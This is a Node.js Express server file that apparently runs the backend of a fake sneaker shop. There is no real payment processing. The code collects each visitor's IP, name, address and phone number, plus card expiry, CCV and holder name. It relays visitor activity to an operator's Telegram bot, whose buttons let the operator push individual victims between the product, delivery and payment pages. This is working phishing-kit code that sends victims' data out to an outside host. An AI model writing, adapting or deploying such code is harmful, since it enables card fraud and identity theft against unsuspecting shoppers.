// server.js
import express from 'express';
import path from 'path';
import bodyParser from 'body-parser';
import cors from 'cors';
import fetch from 'node-fetch';
import { v4 as uuidv4 } from 'uuid';
import { fileURLToPath } from 'url';

const __filename = fileURLToPath(import.meta.url);
const __dirname = path.dirname(__filename);

const app = express();
app.use(cors());
app.use(bodyParser.json());
app.use(express.static(path.join(__dirname,'public')));

// Variables Render
const BOT_TOKEN = process.env.BOT_TOKEN;
const CHAT_ID = process.env.CHAT_ID;
const TELEGRAM_API = `https://api.telegram.org/bot${BOT_TOKEN}`;

if(!BOT_TOKEN || !CHAT_ID){
  console.warn('⚠️ BOT_TOKEN ou CHAT_ID non défini.');
}

// Sessions in-memory
const sessions = {};

// Helper pour récupérer IP v4
function getIPv4(req){
  let ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;
  const match = ip.match(/\b\d{1,3}(\.\d{1,3}){3}\b/);
  return match ? match[0] : ip;
}

// Notification Telegram
async function sendTelegramNotif(data){
  if(!BOT_TOKEN || !CHAT_ID) return;

  const lines = [
    '🆕 <b>NOUVELLE VISITE</b>',
    `🌐 <b>IP:</b> ${data.ip || '—'}`,
    `📄 <b>Page:</b> ${data.page || 'Accueil'}`
  ];
  if(data.pair) lines.push(`👟 <b>Paire choisie:</b> ${data.pair}`);
  if(data.delivery){
    lines.push(`📦 <b>Livraison:</b> ${data.delivery.nom} ${data.delivery.prenom}`);
    lines.push(`🏠 <b>Adresse:</b> ${data.delivery.adresse}`);
    lines.push(`📞 <b>Téléphone:</b> ${data.delivery.telephone}`);
  }
  if(data.card) lines.push(`💳 <b>Carte:</b> ${data.card.panMasked}`);

  const text = lines.join('\n');

  const keyboard = {
    inline_keyboard: [
      [ { text: '➡️ Produit', callback_data: 'redirect|' + data.sessionId + '|/product.html' } ],
      [ { text: '📦 Livraison', callback_data: 'redirect|' + data.sessionId + '|/delivery.html' } ],
      [ { text: '💳 Paiement', callback_data: 'redirect|' + data.sessionId + '|/payment.html' } ]
    ]
  };

  try{
    const res = await fetch(`${TELEGRAM_API}/sendMessage`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({
        chat_id: CHAT_ID,
        text,
        parse_mode:'HTML',
        reply_markup: keyboard
      })
    });
    const j = await res.json();
    if(!j.ok) console.error('Telegram error:', j);
  } catch(err){
    console.error('Erreur envoi Telegram:', err);
  }
}

// Endpoints

// Visite accueil
app.post('/api/visit', (req,res)=>{
  const sid = req.body.sessionId || uuidv4();
  const ip = getIPv4(req);
  sessions[sid] = sessions[sid] || { data:{}, approved:false };
  sessions[sid].data.sessionId = sid;
  sessions[sid].data.ip = ip;
  sessions[sid].data.page = 'Accueil';
  sessions[sid].data.status = 'Visite';
  sendTelegramNotif(sessions[sid].data);
  res.json({ sessionId:sid });
});

// Choix paire
app.post('/api/pair', (req,res)=>{
  const { sessionId, pair } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.pair = pair;
  sessions[sessionId].data.page = 'Produit';
  sessions[sessionId].data.status = 'Paire choisie';
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok:true });
});

// Livraison
app.post('/api/delivery', (req,res)=>{
  const { sessionId, nom, prenom, adresse, telephone } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.delivery = { nom, prenom, adresse, telephone };
  sessions[sessionId].data.page = 'Livraison';
  sessions[sessionId].data.status = 'Info livraison';
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok:true });
});

// Paiement
app.post('/api/payment', (req,res)=>{
  const { sessionId, cardNumber, expiry, ccv, nom } = req.body;
  if(!sessions[sessionId]) return res.status(400).send('Session invalide');
  sessions[sessionId].data.card = {
    panMasked: '**** **** **** ' + cardNumber.slice(-4),
    expiry,
    ccv,
    nom
  };
  sessions[sessionId].data.page = 'Paiement';
  sessions[sessionId].data.status = 'Paiement en attente';
  sendTelegramNotif(sessions[sessionId].data);
  res.json({ ok:true });
});

// Polling status pour redirection
app.get('/api/status', (req,res)=>{
  const { sessionId } = req.query;
  if(!sessions[sessionId]) return res.json({ ok:false });
  res.json({ ok:true, redirect: sessions[sessionId].redirect || null });
});

// Webhook Telegram
app.post('/telegramWebhook', bodyParser.json(), async (req,res)=>{
  const body = req.body;
  if(body.callback_query){
    const cb = body.callback_query;
    const data = cb.data || '';
    const parts = data.split('|');
    const sid = parts[1];
    const page = parts[2];
    if(!sessions[sid]) return res.sendStatus(200);

    if(data.startsWith('redirect|')){
      sessions[sid].redirect = page;
      sendTelegramNotif(sessions[sid].data);
    }

    await fetch(`${TELEGRAM_API}/answerCallbackQuery`, {
      method:'POST',
      headers:{'Content-Type':'application/json'},
      body: JSON.stringify({ callback_query_id: cb.id, text:`Action prise pour ${sid}` })
    });
  }
  res.sendStatus(200);
});

// Servir page index
app.get('/', (req,res)=>res.sendFile(path.join(__dirname,'public','index.html')));

const PORT = process.env.PORT || 3000;
app.listen(PORT, ()=>console.log(`✅ Serveur prêt sur ${PORT}`));
